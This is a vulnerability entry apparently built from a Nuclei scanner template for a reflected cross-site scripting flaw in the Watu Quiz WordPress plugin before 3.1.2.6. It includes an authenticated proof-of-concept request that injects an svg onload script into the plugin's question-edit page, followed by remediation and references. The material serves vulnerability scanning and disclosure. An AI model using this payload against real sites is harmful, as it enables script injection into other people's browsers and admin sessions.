# Nuclei Template: Watu Quiz < 3.1.2.6 - Cross Site Scripting
**Template ID:** watu-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`watu-xss.yaml`)

## Vulnerability Information & PoC

## Description
The Watu Quiz WordPress plugin was affected by a Reflected XSS via question-form.html.php security vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET wp-admin/admin.php?page=watu_question&question=1&action=edit&quiz=1"><svg/onload=alert(document.domain)>  HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Fixed in version 3.1.2.6

## References
- https://wpscan.com/vulnerability/0ba54817-0d32-49b5-b247-9c8fd88b6bca
- https://wordpress.org/plugins/watu/
- https://plugins.trac.wordpress.org/changeset?reponame=&new=2114019%40watu&old=2112579%40watu&
